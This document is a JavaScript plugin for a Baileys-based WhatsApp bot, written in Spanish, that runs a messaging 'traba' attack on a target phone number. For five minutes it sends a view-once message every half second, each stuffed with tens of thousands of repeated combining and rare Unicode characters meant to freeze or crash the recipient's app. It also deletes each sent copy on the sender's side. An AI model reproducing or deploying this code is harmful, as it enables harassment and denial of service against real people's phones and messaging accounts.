import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, command }) => {
  if (!m.fromMe) return;

  const numero = args[0]?.replace(/[^0-9]/g, "");
  if (!numero) return m.reply(`⚠️ Uso correcto:\n.${command} +529991234567`);

  const jid = numero + "@s.whatsapp.net";
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const start = Date.now();
  const duration = 5 * 60 * 1000;
  let enviados = 0;

  const mensajeTraba = {
    viewOnceMessage: {
      message: {
        conversation: "🧪‌⃰Ꮡ‌‌" + 
          "⛧ Zall :: CONCƱΣЯЯOR ⛧" + 
          "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + 
          "𑇂𑆵𑆴𑆿".repeat(60000),
        contextInfo: {
          externalAdReply: {
            title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
            body: `Ataque iniciado`,
            previewType: "PHOTO",
            thumbnail: null,
            sourceUrl: "https://example.com/tama"
          }
        }
      }
    }
  };

  await conn.sendMessage(m.chat, { text: `⏳ Enviando trabas a ${numero} durante 5 minutos...` }, { quoted: m });

  try {
    while (Date.now() - start < duration) {
      const msg = generateWAMessageFromContent(jid, mensajeTraba, {});
      await conn.relayMessage(jid, msg.message, { messageId: msg.key.id });
      await conn.sendMessage(conn.user.id, { delete: msg.key });
      enviados++;
      await delay(500);
    }

    await conn.sendMessage(m.chat, { text: `✅ Ataque completado. Enviadas ${enviados} trabas.` }, { quoted: m });
  } catch (e) {
    await conn.sendMessage(m.chat, { text: "❌ Error durante el ataque:\n" + e.message }, { quoted: m });
  }
};

handler.command = ["trabarios"];
handler.rowner = true;
export default handler;